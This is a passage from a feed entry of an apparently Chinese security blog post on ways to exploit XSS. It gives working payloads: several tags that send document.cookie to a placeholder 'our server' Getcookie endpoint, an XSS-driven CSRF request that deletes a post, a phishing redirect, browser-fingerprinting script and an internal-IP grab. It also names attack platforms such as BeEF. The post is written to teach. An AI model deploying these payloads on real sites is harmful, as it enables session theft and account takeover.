class="line">&lt;script&gt;</span><br><span class="line">window.open(&apos;http://我们的服务器名/Getcookie.php?cookie=&apos;+document.cookie)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第三种img标签</span><br><span class="line">&lt;img src=x onerror=document.body.appendChild(document.createElement(&apos;img&apos;)).setAttribute(&apos;src&apos;,&apos;http://我们的服务器地址/Getcookie?cookie=&apos;+document.cookie); &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第四种body标签</span><br><span class="line">&lt;body οnlοad=eval(“document.body.appendChild(document.createElement(&apos;img&apos;)).setAttribute(&apos;src&apos;,&apos;http://我们的服务器地址/Getcookie?=cookie&apos;+document.cookie);”)&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><ul><li>通过XSS窃取cookie，就能登进用户的账户进行信息窃取或者其他利用</li></ul><h2 id="二、XSS伪造POST-amp-GET"><a href="#二、XSS伪造POST-amp-GET" class="headerlink" title="二、XSS伪造POST&amp;GET"></a>二、XSS伪造POST&amp;GET</h2><p>我们可以通过JS构造出发送请求包的代码，然后结合CSRF达成伪造的目的。</p><p>假设现在有个博客删除文章的请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.blog.com/delete?id=1111</span><br></pre></td></tr></table></figure><p>对于攻击者来说，他只要知道请求的id就可以删除任意想删除的文章。所以他可以通过XSS发出一个跨站的请求，结合CSRF伪造成是用户自己发出改请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&quot;img&quot;);</span><br><span class="line">img.src = &quot;http://www.blog.com/delete?id=1111&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>然后攻击者再通过诱骗受害者点击嵌有这段代码的恶意钓鱼连接，构成CSRF发出了删除操作，借刀杀人。让受害者不知不觉中自己删除了自己的文章</p><ul><li>通过XSS构造任意post或者get请求，就能实现各种想要实现攻击</li></ul><h2 id="三、XSS访问劫持"><a href="#三、XSS访问劫持" class="headerlink" title="三、XSS访问劫持"></a>三、XSS访问劫持</h2><p>假设我们在一个带有XSS漏洞的正常网站的基础上插入了重定向到一个恶意网站的paylaod，例如通过标签发出重定向的请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&quot;www.shabi.com&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样当受害者点击时就会把当前的页面重定向到href标签下面的shabi网站 ，而这个跳转网页假如是精心设计用来钓鱼或者更暴力直接地进行信息窃取，就会造成巨大损失</p><ul><li>通过XSS访问劫持，在受害者打开正常网站后被重定向到一个恶意网站，在一些用户警惕较低情况下可能就被恶意网站所欺骗</li></ul><h2 id="四、窃取用户的主机信息"><a href="#四、窃取用户的主机信息" class="headerlink" title="四、窃取用户的主机信息"></a>四、窃取用户的主机信息</h2><h4 id="1、识别用户浏览器"><a href="#1、识别用户浏览器" class="headerlink" title="1、识别用户浏览器"></a>1、识别用户浏览器</h4><p>第一种是可以通过UserAgent对象读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(navigator.userAgent);</span><br></pre></td></tr></table></figure><p>但是这个对象是可以伪造的，所以信息不一定准确。</p><p>第二种是通过判断同一个浏览器不同版本的细微的差别，准确的识别出浏览器版本。<br>通过万能的JS可以做到，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">if(window.ActiveXObject)&#123;</span><br><span class="line">        //MSIE 6.0 or below</span><br><span class="line">//判断是否是 IE 7以上</span><br><span class="line">if(document.documentElement &amp;&amp; typeof document.documentElement.style.maxHeight != &quot;undefined&quot;)&#123;</span><br><span class="line">//判断是否是 IE 8+</span><br><span class="line">if(typeof document.adoptNode != &quot;undefined&quot;)&#123;//Safari3 &amp; FF &amp; Opera &amp; Chrome &amp; IE 8</span><br><span class="line">//MSIE 8.0 因为同事满足前两个if判断，所以在这里是IE 8</span><br><span class="line">&#125;</span><br><span class="line">//MSIE 7.0 否则就是IE 7</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;msie&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else if(typeof window.opera != &quot;undefined&quot;)&#123;//Opera 独占</span><br><span class="line">//&quot;Opera&quot;+window.opera.version()</span><br><span class="line">alert(&quot;opera&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else if(typeof window.netscape != &quot;undefined&quot;)&#123;//Mozilla 独占</span><br><span class="line">//&quot;Mozilla&quot;</span><br><span class="line">//可以准确识别大版本</span><br><span class="line">if(typeof window.Iterator != &quot;undefined&quot;)&#123;</span><br><span class="line">//Firefox2以上支持这个对象</span><br><span class="line">if(typeof document.styleSheetSets != &quot;undefined&quot;)&#123;//Firefox 3 &amp; Opera 9</span><br><span class="line">//Firefox 3 同时满足这些条件的必然是Firefox 3了</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;mozilla&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else if(typeof window.pageXOffset != &quot;undefined&quot;)&#123;//Mozilla &amp; Safari</span><br><span class="line">//&quot;Safari&quot;</span><br><span class="line">try&#123;</span><br><span class="line">if(typeof external.AddSearchProvider != &quot;undefined&quot;)&#123;//Firefox &amp; Google Chrome</span><br><span class="line">//Google Chrome</span><br><span class="line">alert(&quot;chrome&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">alert(&quot;safari&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else//unknown</span><br><span class="line">&#123;//unknown</span><br><span class="line">alert(&quot;unknown&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种就能精确的获取浏览器信息</p><h4 id="2、识别用户真实IP"><a href="#2、识别用户真实IP" class="headerlink" title="2、识别用户真实IP"></a>2、识别用户真实IP</h4><p>许多时候，用户主机IP地址隐藏在代理服务器或NAT的后面。<br>但JS本身并没有获取本地真实IP地址的能力，一般需要第三方软件来完成。</p><p>比如，客户端安装了Java环境–JRE，就可以通过调用Java中Applet的接口获取客户端的本地IP地址。<br>下面是 Attack API 平台的一个payload利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AttackAPI.dom.getInternalIP = function() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var sock = new java.net.Socket();</span><br><span class="line">        sock.bind(new java.net.InetSocketAddress(&apos;0.0.0.0&apos;, 0));</span><br><span class="line">        sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port) ? 80 : document.location.port));</span><br><span class="line">        return sock.getLocalAddress().getHostAddress();</span><br><span class="line">    &#125; catch(e) &#123;&#125;</span><br><span class="line">    return &apos;127.0.0.1&apos;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="五、XSS构造Worm"><a href="#五、XSS构造Worm" class="headerlink" title="五、XSS构造Worm"></a>五、XSS构造Worm</h2><p>经典例子有Samy Worm和百度蠕虫，具体可以自己搜索学习，这里就不码了</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>XSS的利用方法多种多样，搭配CSRF等打出组合拳更是威力大增。要学好JS代码，才能根本上更大地发挥出XSS的能力！</p><p>最后附上几个XSS平台</p><ul><li><p>Attack API: 将许多能够直接使用的Payload，归纳为API的方式。 </p></li><li><p>BeFF:著名的XSS演示平台。演示的是一个完整的XSS攻击过程。 </p></li><li><p>XSS-Proxy：可以通过嵌套iFrame的方式可以实时地远程控制被XSS攻击的浏览器。 </p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS的利用&quot;&gt;&lt;a href=&quot;#XSS的利用&quot; class=&quot;headerlink&quot; title=&quot;XSS的利用&quot;&gt;&lt;/a&gt;XSS的利用&lt;/h1&gt;&lt;p&gt;起因是上一次面试的时候，在谈及XSS的利用方式时，我只能答得上盗取Cookie和蠕虫，后面回想发现XSS利用
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
